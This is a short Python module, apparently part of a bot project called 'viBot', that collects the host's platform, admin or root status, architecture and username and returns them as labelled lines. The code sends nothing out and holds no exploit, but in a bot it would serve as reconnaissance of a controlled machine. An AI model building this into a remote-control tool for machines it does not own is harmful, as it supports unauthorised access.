#!/usr/bin/env python
#-*- coding: utf-8 -*-
#
#

""" Info module for viBot Project """

__author__ = "blackvkng"

import os
import ctypes
import getpass
import platform

def run():
	if os.name == "nt":
		admin_access = "Yes" if ctypes.windll.shell32.IsUserAnAdmin() != 0 else "No"
	else:
		admin_access = "Yes" if os.getuid() == 0 else "No"

	info = [("[>] Platform        ", platform.system()), 
			("[>] Admin Access    ", admin_access),
			("[>] Architecture    ", platform.architecture()[0]),
			("[>] Username        ", getpass.getuser())]

	return info